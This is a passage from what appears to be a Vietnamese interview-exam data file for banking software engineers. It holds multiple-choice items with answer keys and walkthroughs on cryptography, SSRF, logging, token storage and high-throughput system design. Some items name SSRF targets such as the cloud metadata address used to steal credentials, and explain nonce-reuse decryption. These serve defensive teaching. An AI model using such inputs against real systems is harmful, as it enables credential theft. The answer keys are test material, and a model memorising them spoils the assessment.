          "whyCorrect": "Phát hiện lỗi này trong buổi Code Review sẽ khiến cả hội đồng phỏng vấn ngả mũ thán phục em! Rất nhiều lập trình viên nghe nói *'Đừng dùng ECB, hãy dùng AES-GCM'* nhưng tới lúc code lại lười biếng gõ bừa một chuỗi hằng số `\"123456789012\"` làm Initialization Vector (IV)! Hãy nhớ bản chất toán học của `AES-GCM`: bên dưới nó là chế độ đếm **CTR (Stream Cipher)**, tức là `Ciphertext = Plaintext XOR Keystream(Key, IV)`. Nếu `Key` và `IV` cố định thì `Keystream` của cả triệu bản ghi giống hệt nhau! Khi đó `C1 XOR C2 = P1 XOR P2` — chỉ cần kẻ tấn công biết mức lương của chính hắn (`P1`), hắn lấy `C1 XOR C2 XOR P1` là đọc vanh vách mức lương (`P2`) của Tổng Giám đốc trong tích tắc, đồng thời bẻ gãy luôn trường hữu hạn `GHASH` để sửa số tiền tùy ý mà không báo lỗi giả mạo! Luôn sinh 12 bytes ngẫu nhiên bằng `SecureRandom` cho MỖI lần `convertToDatabaseColumn`!",
          "whyWrong": [
            "Độ dài Tag xác thực `128 bit` (16 bytes) trong `GCMParameterSpec` là mức chuẩn khuyến nghị an toàn cao nhất của NIST SP 800-38D.",
            "",
            "Cẩn thận bẫy kép: đối tượng `javax.crypto.Cipher` hoàn toàn **KHÔNG Thread-safe**! Khai báo `static final Cipher` cho 200 luồng cùng gọi `init`/`doFinal` sẽ ném lỗi loạn xạ và trộn dữ liệu giữa các khách hàng.",
            "DES 56-bit đã bị khai tử từ lâu vì quá yếu; AES-256-GCM vẫn là tiêu chuẩn vàng hiện hành khi dùng đúng IV ngẫu nhiên."
          ],
          "tip": "Nhìn thấy `AES/GCM` trong bài Code Review -> Mắt soi ngay tham số `IV`: Hễ thấy `IV` hardcode tĩnh hoặc dùng `java.util.Random` thường thay vì `SecureRandom` mới cho từng bản ghi -> Chặn PR ngay lập tức!"
        }
      },
      {
        "id": "R3-24",
        "domain": "Phòng chống SSRF & Phân quyền Cấp Chức năng (K5)",
        "lessonId": "K5",
        "difficulty": "Trung bình",
        "caseStudy": null,
        "question": "Một API phục vụ khách hàng doanh nghiệp `POST /api/v1/corporate/logo-preview` nhận tham số `imageUrl` để máy chủ Backend tải ảnh logo về chèn vào mẫu ủy nhiệm chi PDF, đồng thời trong cùng Controller có endpoint quản trị `POST /api/v1/corporate/admin/waive-fee` miễn phí chuyển tiền chỉ được ẩn nút bấm trên giao diện Web chứ không gắn kiểm tra quyền trên Backend. Hai lỗ hổng nghiêm trọng nào đang tồn tại và cách vá chuẩn là gì?",
        "options": [
          "Lỗ hổng **SSRF (Server-Side Request Forgery)** khi cho phép truyền URL tùy ý khiến kẻ tấn công nhập `http://169.254.169.254/...` hoặc `http://internal-core-ledger:8080/actuator` để dò quét mạng nội bộ ngân hàng, VÀ lỗ hổng **BFLA (Broken Function Level Authorization - OWASP API5)** khi chỉ ẩn nút trên UI; cách vá là bỏ nhận URL tùy ý (chuyển sang cho upload file ảnh kiểm tra định dạng/magic bytes qua Object Storage cách ly, hoặc bắt buộc Allowlist domain + chặn toàn bộ dải IP nội bộ/loopback/metadata sau bước phân giải DNS) và gắn `@PreAuthorize(\"hasRole('BACKOFFICE_FEE_ADMIN')\")` cứng tại tầng Backend.",
          "Chỉ cần kiểm tra chuỗi `imageUrl.startsWith(\"https://\")` bằng hàm `String` đơn giản là chặn được 100% SSRF, còn nút miễn phí đã ẩn trên giao diện React build minify rồi nên không ai tìm ra URL được.",
          "Cho phép máy chủ Core Banking truy cập thẳng ra toàn bộ mạng Internet không qua Proxy để tải ảnh logo nhanh hơn.",
          "Đổi tên đường dẫn từ `/admin/waive-fee` thành `/hidden-secret-99/waive-fee` mà vẫn giữ quyền truy cập cho mọi user đăng nhập thường."
        ],
        "answer": 0,
        "walkthrough": {
          "keyword": "nhận tham số imageUrl để máy chủ Backend tải ảnh về ... endpoint /admin/waive-fee chỉ ẩn nút bấm trên giao diện Web",
          "whyCorrect": "Một cặp lỗ hổng thực chiến cực kỳ nguy hiểm trên cổng ngân hàng doanh nghiệp! Thứ nhất, bất kỳ tính năng nào nhận `url` từ người dùng để máy chủ Backend đứng ra tải hộ đều mở ra mặt trận **SSRF (OWASP API7)**: từ vùng DMZ/Internal, máy chủ có thể bị lợi dụng đọc Cloud Instance Metadata (`169.254.169.254`) lấy IAM credentials hoặc gọi thẳng các microservice nội bộ không mở ra Internet! Cách an toàn nhất trong ngân hàng là **không cho Backend tự đi fetch URL do khách nhập** (cho khách upload trực tiếp file ảnh đã quét mã độc/kiểm tra magic bytes). Thứ hai, ẩn nút bấm trên Frontend hoàn toàn vô nghĩa trước Burp Suite / Postman — mọi API quản trị như miễn giảm phí (`waive-fee`) bắt buộc phải kiểm soát RBAC tường minh bằng `@PreAuthorize` ngay trên Method/SecurityFilterChain và có bước phê duyệt 4 mắt (Maker-Checker)!",
          "whyWrong": [
            "",
            "Kiểm tra `startsWith(\"https://\")` dễ dàng bị vượt qua bằng kỹ thuật HTTP Redirect `302` từ một domain HTTPS của hacker trỏ thẳng về `http://127.0.0.1:8080` hoặc kỹ thuật DNS Rebinding!",
            "Máy chủ vùng Core Banking theo chuẩn phân vùng mạng ngân hàng bị cấm tuyệt đối mở kết nối chiều ra (Egress) trực tiếp tới Internet công cộng.",
            "Đổi tên URL bí mật mà không kiểm tra Role/Permission trên Server vẫn là lỗi Broken Function Level Authorization điển hình."
          ],
          "tip": "Thấy Backend nhận `url` đi tải hộ -> Báo động đỏ **SSRF** (ưu tiên đổi sang Upload trực tiếp hoặc chặn dải Private IP/Metadata sau bước DNS resolve + tắt HTTP Redirect); Thấy API quản trị/duyệt phí -> Bắt buộc `@PreAuthorize` + mô hình **Maker-Checker**!"
        }
      },
      {
        "id": "R3-25",
        "domain": "Structured JSON Logging, MDC & Chống Rò rỉ Ngữ cảnh (O4)",
        "lessonId": "O4",
        "difficulty": "Khó (Bẫy đa luồng)",
        "caseStudy": null,
        "question": "Để phục vụ truy vết giao dịch trên Kibana/OpenSearch, đội phát triển viết một Servlet Filter gắn `MDC.put(\"cif\", currentCif)` và `MDC.put(\"traceId\", traceId)` ở đầu mỗi request, đồng thời dùng một `ThreadPoolExecutor` tùy chỉnh xử lý bất đồng bộ việc gửi thông báo nhưng quên dọn dẹp MDC sau khi xử lý xong. Hậu quả nguy hiểm nào sẽ xảy ra trên môi trường Production chịu tải cao và cách khắc phục chuẩn là gì?",
        "options": [
          "Không có hậu quả gì vì Garbage Collector của Java sẽ tự động xóa sạch dữ liệu trong `ThreadLocal` ngay khi kết thúc hàm HTTP Controller.",
          "Lưu toàn bộ nội dung body request thô (chứa cả mật khẩu, mã PIN và số thẻ) vào biến `MDC` để tiện tìm kiếm khi có lỗi.",
          "Ghi log bằng `System.out.println` nối chuỗi thủ công thay cho Slf4j + Logback JSON Encoder để tăng gấp 10 lần thông lượng ghi đĩa.",
          "Do Slf4j `MDC` lưu trữ dựa trên `ThreadLocal` gắn với các luồng được tái sử dụng (Thread Reuse) trong Tomcat Pool và Worker Pool, việc quên gọi `MDC.clear()` / `MDC.remove()` trong khối `finally` sẽ gây **nhiễm bẩn ngữ cảnh chéo (MDC Context Leakage)**: giao dịch của Khách hàng B tái sử dụng đúng luồng vừa chạy cho Khách hàng A (hoặc request không đăng nhập) sẽ bị in nhầm `cif` và `traceId` của Khách hàng A vào nhật ký kiểm toán! Cách sửa chuẩn là luôn bọc `try { ... } finally { MDC.clear(); }` ở Filter VÀ cài đặt `TaskDecorator` sao chép - dọn dẹp MDC an toàn cho mọi luồng `@Async`/Executor."
        ],
        "answer": 3,
        "walkthrough": {
          "keyword": "MDC.put(\"cif\", ...) ... ThreadPoolExecutor tái sử dụng luồng quên dọn dẹp MDC",
          "whyCorrect": "Câu chốt đề số 3 cực kỳ tinh tế và sát sườn thực tế! Anh từng gặp đúng sự cố này khi điều tra log cho một ngân hàng: tại sao một API public kiểm tra tỷ giá không hề đăng nhập mà trong JSON log lại in chình ình `cif: 8899123` của một khách hàng vừa chuyển tiền giây trước đó?! Thủ phạm chính là cơ chế **Thread Pool Reuse**: các luồng của Tomcat hay `ThreadPoolExecutor` KHÔNG chết đi sau mỗi request mà sống suốt vòng đời ứng dụng để đón request kế tiếp; vì `MDC` dùng `ThreadLocal` bên dưới, nếu không có `finally { MDC.clear(); }`, giá trị cũ vẫn dính chặt trên luồng đó và làm sai lệch toàn bộ bằng chứng điều tra kiểm toán! Kết hợp `finally { MDC.clear(); }` tại Filter, `TaskDecorator` cho luồng con bất đồng bộ và bộ lọc Masking che mờ dữ liệu nhạy cảm ngay tại Logback Encoder là bộ ba chuẩn chỉ nhất.",
          "whyWrong": [
            "Garbage Collector KHÔNG thu gom dữ liệu trong `ThreadLocal` chừng nào bản thân luồng (Thread trong Pool) vẫn đang sống và giữ tham chiếu tới `ThreadLocalMap` của nó!",
            "Nhét mật khẩu, mã PIN và số thẻ PAN vào `MDC` sẽ làm thông tin tối mật này tự động bị nhân bản in ra trên MỌI dòng log của tất cả thư viện trong suốt vòng đời request đó, vi phạm thảm khốc PCI-DSS!",
            "`System.out.println` dùng khóa đồng bộ (`synchronized (this)`) chặn nghẽn luồng nghiêm trọng ở tải cao và không xuất được định dạng Structured JSON chuẩn để lập chỉ mục trên OpenSearch.",
            ""
          ],
          "tip": "Hễ đụng tới `MDC` hoặc `ThreadLocal` trong môi trường dùng Thread Pool (Tomcat, `@Async`, Kafka Listener) -> Phản xạ bắt buộc 100%: `try { ... } finally { MDC.clear(); }` + `TaskDecorator` cho luồng con!"
        }
      }
    ]
  };

  var r4CaseStudy = {
    "title": "Case Study: OmniBank Super App — Kiến trúc Full-Stack Ngân hàng số & Hệ thống Chuyển tiền 10.000 TPS",
    "context": "OmniBank phục vụ 12 triệu người dùng bán lẻ thông qua cổng Web Internet Banking viết bằng React 19 / Next.js + TypeScript chạy tại tên miền `https://ib.omnibank.vn` kết nối qua tầng Backend-for-Frontend (`https://bff.omnibank.vn`), cùng hệ thống Quầy giao dịch (Teller Counter) viết bằng Angular 18 chạy tại `https://teller.internal.omnibank.vn` phục vụ 4.500 giao dịch viên tại 320 chi nhánh. Hệ thống lõi phía sau phải đáp ứng tải đỉnh 10.000 giao dịch chuyển tiền/giây (10k TPS) vào dịp cận Tết, các đợt quyên góp từ thiện cấp quốc gia (nơi có tới 5.000 người cùng chuyển khoản vào ĐÚNG 1 tài khoản thiện nguyện duy nhất mỗi giây) và chương trình Flash-Sale 'Hoàn tiền 50% lúc 12:00:00' thu hút 1 triệu lượt bấm đồng thời tranh 10.000 suất ngân sách khuyến mãi với cam kết P99 < 100ms và không vượt ngân sách dù 1 đồng. Song song đó, OmniBank cần vận hành Trung tâm Thông báo đa kênh đảm bảo tin nhắn OTP xác thực giao dịch luôn đến tay khách hàng trong dưới 2 giây (bất chấp việc khối Marketing bắn 5 triệu tin quảng cáo cùng thời điểm), và cổng Tra cứu Sao kê 5 năm cho phép tìm kiếm đa tiêu chí kèm xuất báo cáo 500.000 dòng mà không gây ảnh hưởng đến cơ sở dữ liệu hạch toán lõi (OLTP)."
  };

  var examR4 = {
    "id": "senior-round-4",
    "cert": "Vòng 4 · Fullstack & System Design",
    "title": "Đề Thi Tuyển Số 4 — Full-Stack Ngân Hàng (React/Angular/BFF/CORS) & System Design 10.000 TPS",
    "subtitle": "25 câu hỏi tình huống kiến trúc sư + Case Study Super App Ngân hàng số & Chuyển tiền 10k TPS · Phủ đều F1..F6, A1..A6, C1..C6",
    "durationMinutes": 50,
    "passingScore": 700,
    "questions": [
      {
        "id": "R4-01",
        "domain": "Bảo mật Trình duyệt, CORS & BFF Token Handler (F1, F5)",
        "lessonId": "F1",
        "difficulty": "Trung bình",
        "caseStudy": r4CaseStudy,
        "question": "Ứng dụng Web Internet Banking tại `https://ib.omnibank.vn` cần xác thực người dùng và gọi các API tài chính qua dịch vụ BFF tại `https://bff.omnibank.vn`. Để bảo vệ tuyệt đối OAuth2 Access/Refresh Token trước nguy cơ đánh cắp qua XSS trên trình duyệt mà vẫn chống được tấn công CSRF và tuân thủ chuẩn CORS của trình duyệt, kiến trúc nào sau đây là chuẩn xác nhất?",
        "options": [
          "Trả trực tiếp cả `access_token` lẫn `refresh_token` dài hạn về code JavaScript của React để lưu vào `window.localStorage`, đồng thời cấu hình trên BFF `Access-Control-Allow-Origin: *` đi kèm `Access-Control-Allow-Credentials: true`.",
          "Áp dụng mô hình **BFF Token Handler**: giữ toàn bộ OAuth2 Access Token và Refresh Token nằm an toàn phía Server BFF (Redis Session mã hóa), chỉ cấp xuống trình duyệt một Session Cookie có tiền tố bảo mật (`Set-Cookie: __Host-ib_sess=...; HttpOnly; Secure; Path=/; SameSite=Strict` hoặc `Lax` kèm Anti-CSRF Token Header), và cấu hình CORS trên BFF chỉ định danh sách trắng tường minh `Access-Control-Allow-Origin: https://ib.omnibank.vn` với `Allow-Credentials: true`.",
          "Đính kèm `refresh_token` vào chuỗi Query Parameter trên thanh địa chỉ URL của mọi trang màn hình để khi người dùng bấm F5 không bị đăng xuất.",
          "Tắt hoàn toàn cơ chế kiểm tra CORS trên trình duyệt của 12 triệu khách hàng bằng cách hướng dẫn khách hàng cài đặt tiện ích mở rộng (Browser Extension) vô hiệu hóa bảo mật."
        ],
        "answer": 1,
        "walkthrough": {
          "keyword": "ib.omnibank.vn gọi qua bff.omnibank.vn ... bảo vệ OAuth2 Access/Refresh Token trước XSS mà vẫn chống CSRF và chuẩn CORS",
          "whyCorrect": "Chào em, mở màn Vòng 4 bằng chuẩn kiến trúc bảo mật Web hiện đại nhất của các ngân hàng số lớn (theo khuyến nghị OAuth 2.0 for Browser-Based Apps của IETF)! Khi nhét Token vào `localStorage` hay `sessionStorage`, mọi đoạn script chạy trên trang (kể cả 1 package npm phụ bị dính Supply-Chain XSS) đều đọc sạch toàn bộ Refresh Token bằng 1 dòng `localStorage.getItem(...)` và mang về máy chủ của hacker dùng thoải mái! Với **BFF Token Handler Pattern**, trình duyệt hoàn toàn KHÔNG cầm OAuth2 Token nào cả — BFF giữ Token ở tầng Server, giao tiếp với trình duyệt qua Cookie gắn cờ **`HttpOnly`** (JS không đọc được), **`Secure`** (chỉ truyền qua HTTPS), tiền tố **`__Host-`** (chống ghi đè cookie từ subdomain bị chiếm quyền) và **`SameSite` + CSRF Token** kết hợp CORS khớp chính xác Origin `https://ib.omnibank.vn`!",
          "whyWrong": [
            "Lưu `refresh_token` trong `localStorage` rất dễ bị đánh cắp trọn vẹn phiên qua XSS; ngoài ra theo đặc tả Fetch/CORS của W3C, cấu hình `Access-Control-Allow-Origin: *` kết hợp `Access-Control-Allow-Credentials: true` là bất hợp lệ và sẽ bị mọi trình duyệt chặn ngay lập tức!",
            "",
            "Đặt Token trên URL Query String sẽ làm lộ sạch bí mật phiên vào Browser History, Server Access Logs, Proxy Logs và HTTP `Referer` header.",
            "CORS là hàng rào bảo vệ người dùng của trình duyệt dựa trên Same-Origin Policy; không một ngân hàng nào lại yêu cầu khách hàng tắt bảo mật trình duyệt cả."
          ],
          "tip": "Công thức Vàng cho Web Internet Banking SPA: **Cấm lưu Refresh Token ở `localStorage`** -> Dùng **BFF Token Handler** + **`__Host-` Cookie (`HttpOnly; Secure; SameSite`)** + **Explicit CORS Origin Allowlist** + **CSRF Defense**!"
        }
      },
      {
        "id": "R4-02",
        "domain": "TypeScript Xử lý Tiền tệ & Chống Bấm Đúp Lệnh (F2)",
        "lessonId": "F2",
        "difficulty": "Trung bình",
        "caseStudy": r4CaseStudy,
        "question": "Trên màn hình Chuyển tiền của `ib.omnibank.vn`, Frontend cần hiển thị tạm tính phí chuyển khoản (0,1% giá trị giao dịch), tạo chuỗi dữ liệu để người dùng ký xác nhận, và cho phép người dùng bấm nút 'Thử gửi lại' khi mạng 4G trên tàu cao tốc bị rớt kết nối giữa chừng. Cách cài đặt TypeScript/React nào tránh được sai số dấu phẩy động và đảm bảo không bao giờ trừ tiền 2 lần?",
        "options": [
          "Xử lý và truyền số tiền dưới dạng chuỗi thập phân chuẩn xác / số nguyên đơn vị nhỏ nhất hoặc thư viện số học thập phân (`Decimal.js` / `BigInt`) đồng bộ quy tắc làm tròn với `BigDecimal` của Backend; đồng thời khởi tạo `idempotencyKey` gắn chặt với **ý định giao dịch hiện tại** (giữ nguyên cùng một `Idempotency-Key` suốt các lần retry mạng của cùng lệnh đó, chỉ làm mới khi khách hàng chủ động tạo lệnh chuyển tiền mới hoặc sửa thông tin giao dịch) kết hợp khóa trạng thái nút bấm (`isSubmitting`) khi request đang bay.",
          "Dùng phép nhân `const fee = Number(amount) * 0.001` của JavaScript để ghép vào chuỗi ký số, và mỗi lần người dùng bấm nút 'Thử gửi lại' thì gọi `crypto.randomUUID()` sinh một mã `Idempotency-Key` mới tinh để Backend không báo trùng.",
          "Chỉ vô hiệu hóa nút bấm bằng thuộc tính HTML `disabled` trên giao diện còn phía Backend bỏ hoàn toàn kiểm tra `Idempotency-Key` cho nhẹ Database.",
          "Làm tròn mọi số tiền chuyển khoản của khách xuống bội số của 100.000 VNĐ bằng `Math.floor()` để né phần lẻ."
        ],
        "answer": 0,
        "walkthrough": {
          "keyword": "tính phí 0,1% tạo chuỗi ký xác nhận ... bấm 'Thử gửi lại' khi mạng 4G rớt kết nối ... tránh sai số dấu phẩy động và không trừ tiền 2 lần",
          "whyCorrect": "Câu hỏi bắt trúng hai lỗi thực chiến mà rất nhiều lập trình viên Full-Stack mắc phải! Lỗi 1: Kiểu `number` trong JavaScript/TypeScript tuân theo IEEE 754 binary64 (giống hệt `double` của Java), nên các phép toán thập phân như `0.1 + 0.2 === 0.30000000000000004` hoặc nhân tỷ lệ phí sẽ sinh đuôi rác thập phân làm lệch chuỗi ký số đối chiếu với `BigDecimal` trên Server -> phải dùng `Decimal.js`, `BigInt` (cho VNĐ nguyên đồng) và truyền tiền trong JSON dạng chuỗi `\"15000000\"`! Lỗi 2 (cực kỳ tinh vi): Nếu sinh lại `Idempotency-Key` mới ở mỗi lần bấm 'Thử gửi lại', thì khi request đầu thực ra ĐÃ tới Server thành công (chỉ rớt gói phản hồi về), cú bấm thử lại mang mã mới sẽ bị Backend coi là giao dịch thứ 2 và trừ tiền lần nữa! Mã `Idempotency-Key` phải đại diện cho **1 ý định giao dịch (Transaction Intent)** giữ cố định qua các lần retry mạng!",
          "whyWrong": [
            "",
            "Dùng `Number * 0.001` gây sai số nhị phân IEEE 754, còn đổi `Idempotency-Key` mới mỗi lần retry mạng làm phá sản hoàn toàn ý nghĩa chống thực thi kép của Idempotency!",
            "Khóa nút `disabled` trên UI chỉ là lớp bảo vệ trải nghiệm người dùng (UX), không chống được trường hợp rớt mạng bấm lại, trình duyệt tự retry hay kẻ gian gọi API trực tiếp.",
            "Tự ý cắt gọt số tiền giao dịch của khách hàng là sai phạm nghiệp vụ không thể tồn tại trong bất kỳ ứng dụng tài chính nào."
          ],
          "tip": "Luật bất biến về `Idempotency-Key` ở Frontend: **Sinh 1 lần khi mở/chốt Form ý định giao dịch, GIỮ NGUYÊN khi retry lỗi mạng**, chỉ xoay mã mới khi khách hàng tạo giao dịch khác!"
        }
      },
      {
        "id": "R4-03",
        "domain": "Angular Quầy Giao dịch: RxJS exhaustMap & Interceptor (F4)",
        "lessonId": "F4",
        "difficulty": "Khó (Thực chiến Angular)",
        "caseStudy": r4CaseStudy,
        "question": "Trên hệ thống Quầy Giao dịch Angular 18 (`teller.internal.omnibank.vn`), giao dịch viên có thói quen gõ phím `Enter` liên tiếp 2–3 lần thật nhanh khi nộp tiền mặt cho khách. Ngoài ra, màn hình Dashboard Quầy khi mở lên gọi đồng thời 6 API độc lập; nếu đúng lúc Access Token vừa hết hạn (cả 6 API cùng trả về `401 Unauthorized`), ứng dụng hiện đang bắn 6 lệnh Refresh Token trùng nhau gây lỗi thu hồi phiên (Reuse Detection)! Bạn thiết kế RxJS tại nút nộp tiền và `HttpInterceptor` như thế nào?",
        "options": [
          "Dùng toán tử `mergeMap` cho sự kiện bấm nút nộp tiền để chạy song song cả 3 lần gõ `Enter`, và trong `HttpInterceptor` hễ gặp `401` là gọi ngay `window.location.href = '/login'` bắt giao dịch viên đăng nhập lại từ đầu sau mỗi 5 phút.",
          "Dùng toán tử `switchMap` cho nút nộp tiền để lần gõ `Enter` thứ hai hủy kết nối HTTP trên trình duyệt của lần gõ thứ nhất (tin rằng Backend cũng sẽ tự động hủy giao dịch đang ghi DB).",
          "Dùng toán tử **`exhaustMap`** cho luồng sự kiện nộp tiền mặt (bỏ qua hoàn toàn mọi cú gõ `Enter`/click tiếp theo chừng nào Observable gọi API hạch toán hiện tại chưa hoàn tất); đồng thời trong `HttpInterceptor` sử dụng cờ `isRefreshing` kết hợp `BehaviorSubject<string | null>` để chỉ cho phép **ĐÚNG 1 request đầu tiên gọi API Refresh Token**, còn 5 request bị `401` còn lại xếp hàng chờ (`filter(token => token !== null), take(1), switchMap(...)`) nhận Token mới rồi tự động thực thi lại mượt mà.",
          "Bắt giao dịch viên rút bàn phím ra và chỉ dùng chuột bấm nút, đồng thời kéo dài thời hạn Access Token của quầy lên 365 ngày không bao giờ hết hạn."
        ],
        "answer": 2,
        "walkthrough": {
          "keyword": "giao dịch viên gõ phím Enter liên tiếp 2–3 lần ... 6 API gọi đồng thời cùng gặp 401 bắn 6 lệnh Refresh Token trùng nhau gây lỗi Reuse Detection",
          "whyCorrect": "Nếu đi phỏng vấn Full-Stack/Frontend Lead tại các ngân hàng dùng Angular cho hệ thống Core Teller hay Back-Office (như Vietcombank, ACB, MB, VPBank...), trả lời được câu này là ăn trọn điểm tuyệt đối! Hãy phân biệt thật sắc: `switchMap` chỉ hủy việc lắng nghe ở trình duyệt chứ **KHÔNG HỀ ngăn được lệnh HTTP thứ nhất đã bay vào Backend ghi sổ cái**, nên gõ 2 lần vẫn nổ 2 giao dịch nộp tiền! Ngược lại, **`exhaustMap`** khóa cổng ngay từ cú nhấn đầu tiên: mọi cú nhấn thứ 2, thứ 3 trong lúc request đang bay đều bị phớt lờ sạch sẽ! Còn ở `HttpInterceptor`, kỹ thuật **Refresh Token Mutex Queue bằng `BehaviorSubject`** giúp gom 6 lỗi `401` đồng thời về đúng 1 cuộc gọi `/auth/refresh` duy nhất, tránh kích hoạt nhầm cảnh báo đánh cắp Token (Refresh Token Reuse Detection) ở phía Identity Server!",
          "whyWrong": [
            "`mergeMap` bắn song song toàn bộ cả 3 lần gõ phím lên Server gây hạch toán trùng; còn văng ra màn hình đăng nhập mỗi 5 phút làm đứt đoạn công việc đang nhập dở của 4.500 giao dịch viên tại quầy.",
            "Ngộ nhận kinh điển về `switchMap`: hủy subscription phía Client hoàn toàn KHÔNG rollback được tiến trình xử lý đã vào tới tầng Controller/Service của Backend, mà lần nhấn thứ 2 lại bắn tiếp thêm 1 POST request mới lên Server!",
            "",
            "Access Token sống 1 năm vi phạm nghiêm trọng chuẩn bảo mật ngân hàng tại quầy giao dịch vốn có quyền hạn hạch toán tiền mặt rất lớn."
          ],
          "tip": "Bản đồ toán tử RxJS Ngân hàng: Ô tìm kiếm gõ chữ liên tục -> `debounceTime + distinctUntilChanged + switchMap`; Nút bấm Nộp tiền / Chuyển khoản -> Bắt buộc **`exhaustMap`**; Nhiều API gặp `401` cùng lúc -> **`BehaviorSubject` Queue**!"
        }
      },
      {
        "id": "R4-04",
        "domain": "System Design 10k TPS & Bài toán Hot Account (A1)",
        "lessonId": "A1",
        "difficulty": "Khó (Câu hỏi phân loại Senior/Architect)",
        "caseStudy": r4CaseStudy,
        "question": "Trong đợt kêu gọi ủng hộ đồng bào vùng lũ, có tới 5.000 khách hàng trên toàn quốc cùng bấm chuyển tiền vào **ĐÚNG 1 SỐ TÀI KHOẢN THIỆN NGUYỆN DUY NHẤT** mỗi giây (5.000 TPS trên 1 dòng dữ liệu). Nếu dùng mô hình khóa dòng truyền thống `SELECT * FROM accounts WHERE account_no = 'CHARITY_01' FOR UPDATE` với thời gian giữ khóa mỗi giao dịch chỉ 5ms, thông lượng tối đa lý thuyết của tài khoản này bị kịch trần ở `1000ms / 5ms = 200 TPS`, khiến 4.800 giao dịch/giây còn lại bị xếp hàng nổ Timeout sập hệ thống! Kiến trúc nào giải quyết triệt để nút thắt **Hot Account** này mà vẫn bảo toàn 100% tính chính xác kế toán?",
        "options": [
          "Tắt hoàn toàn cơ chế khóa dòng và đọc `balance` vào bộ nhớ Java của 20 Pod, cộng tiền trên từng Pod rồi ghi đè `UPDATE accounts SET balance = :newBalance` không cần điều kiện.",
          "Bắt người dân trên cả nước lấy số thứ tự và mỗi giây chỉ cho phép đúng 50 người chuyển khoản, 4.950 người còn lại trả về lỗi hệ thống bận.",
          "Nâng cấp RAM của máy chủ Database từ 64GB lên 512GB mà vẫn giữ nguyên đúng 1 dòng bản ghi duy nhất bị khóa tuần tự bởi `SELECT FOR UPDATE`.",
          "Áp dụng kiến trúc **Sub-account Bucketing / Account Striping (Chia dải ví phụ nội bộ)** cho các tài khoản được đánh dấu/tự động phát hiện là Hot Account: tách tài khoản nhận `CHARITY_01` thành $N$ phân mảnh sổ phụ độc lập trong DB (VD: 64 bucket `CHARITY_01#00` .. `CHARITY_01#63`); khi ghi Có (Credit-only), hệ thống băm `hash(txnId) % 64` để phân tán đều khóa sang 64 dòng độc lập đạt thông lượng $64 \\times 200 = 12.800\\text{ TPS}$, kết hợp tiến trình gộp số dư định kỳ (Periodic Roll-up / Sweep) về tài khoản chính và khi cần chi/rút tiền thì thu gom từ các bucket!"
        ],
        "answer": 3,
        "walkthrough": {
          "keyword": "5.000 khách hàng cùng chuyển tiền vào ĐÚNG 1 SỐ TÀI KHOẢN THIỆN NGUYỆN mỗi giây ... SELECT FOR UPDATE kịch trần ở 200 TPS",
          "whyCorrect": "Đỉnh cao của System Design Tài chính quy mô lớn! Theo định luật Amdahl và toán học hàng đợi: dù máy chủ DB có 128 nhân CPU và 1TB RAM đi nữa, nếu 5.000 luồng cùng tranh giành khóa độc quyền (Row-level Exclusive Lock) trên **1 dòng vật lý duy nhất**, chúng buộc phải chạy nối đuôi nhau từng luồng một (1 luồng chạy, 4.999 luồng đứng đợi)! Bí quyết của các siêu hệ thống thanh toán (Alipay, WeChat Pay, Core Banking thế hệ mới) là nhận ra chiều nhận tiền quyên góp/thu hộ là chiều **Ghi Có cộng thêm (Credit)** có tính giao hoán kết hợp! Bằng kỹ thuật **Sub-account Striping (chia thành 32–64 sub-ledger buckets)**, ta biến 1 điểm nghẽn cổ chai thành 64 làn cao tốc chạy song song ngay trong giao dịch ACID chuẩn mực, đẩy trần thông lượng vọt qua mốc 10.000 TPS một cách nhẹ nhàng mà không mất dù 1 đồng!",
          "whyWrong": [
            "Đọc số dư lên 20 Pod rồi ghi đè không khóa là lỗi **Lost Update** kinh điển: 4.900 giao dịch sẽ ghi đè xóa sạch tiền của nhau khiến quỹ từ thiện thất thoát hàng chục tỷ đồng!",
            "Từ chối 99% lưu lượng hợp lệ đi ngược hoàn toàn với mục tiêu thiết kế hệ thống chịu tải 10.000 TPS của ngân hàng.",
            "Thêm RAM không thể rút ngắn giới hạn tuần tự hóa của khóa độc quyền trên 1 dòng dữ liệu đơn lẻ (CPU 127 nhân còn lại vẫn ngồi chơi nhìn 1 nhân xử lý dòng khóa đó!).",
            ""
          ],
          "tip": "Vũ khí bí mật ăn điểm tuyệt đối khi phỏng vấn System Design Ngân hàng: Hễ gặp **Hot Account (Từ thiện / Thu hộ điện nước / Tài khoản phí GL trung tâm)** -> Nêu ngay phép tính kịch trần `1000ms / lock_hold_ms` và tung chiêu **Sub-account Bucketing / Striping (32–64 buckets)** + **Async Batch Aggregation**!"
        }
      },
      {
        "id": "R4-05",
        "domain": "System Design Flash-Sale Hoàn tiền 1 Triệu Click (A2)",
        "lessonId": "A2",
        "difficulty": "Khó",
        "caseStudy": r4CaseStudy,
        "question": "Đúng 12:00:00 trưa, 1.000.000 khách hàng trên Super App OmniBank cùng bấm nút săn suất 'Hoàn tiền 50% (tối đa 50.000đ)' với tổng ngân sách chiến dịch cứng là đúng 10.000 suất (500 triệu VNĐ), mỗi CIF chỉ được nhận tối đa 1 lần, yêu cầu P99 < 100ms và tuyệt đối không phát lố ngân sách. Kiến trúc phân tầng nào tối ưu và an toàn nhất?",
        "options": [
          "Cho cả 1.000.000 request đi thẳng vào PostgreSQL chạy câu lệnh `SELECT remaining_quota FROM campaigns WHERE id = 1 FOR UPDATE` để trừ dần từ 10.000 về 0.",
          "Kiến trúc phễu lọc 3 tầng: (1) Tầng biên CDN + API Gateway lọc Bot/Device Fingerprint và Rate Limit theo người dùng; (2) Tầng bộ nhớ đệm thực thi **1 Redis Lua Script nguyên tử (Atomic Lua)** kiểm tra đồng thời `SISMEMBER/SETBit` (CIF này đã nhận chưa?) và `remaining_quota > 0` rồi trừ tồn kho ngay trong RAM dưới 1ms (loại bỏ gọn 990.000 lượt trượt mà không chạm DB); (3) Chỉ 10.000 lượt trúng mới được đẩy sự kiện bền vững qua **Apache Kafka** để Worker phía sau ghi nhận Voucher/Bút toán hoàn tiền vào Sổ cái PostgreSQL kèm Job đối soát ngân sách chiến dịch.",
          "Đọc `remaining_quota` từ Redis lên ứng dụng Java bằng lệnh `GET`, kiểm tra `if (quota > 0)` trong Java rồi gọi lệnh `DECR` riêng rẽ về Redis.",
          "Cứ trả về thông báo 'Chúc mừng bạn đã trúng thưởng!' cho tất cả 1.000.000 người lúc 12:00:00, sau đó âm thầm thu hồi lại tiền của 990.000 người vào buổi tối."
        ],
        "answer": 1,
        "walkthrough": {
          "keyword": "1.000.000 khách hàng bấm cùng lúc 12:00:00 ... đúng 10.000 suất, mỗi CIF tối đa 1 lần, P99 < 100ms, không lố ngân sách",
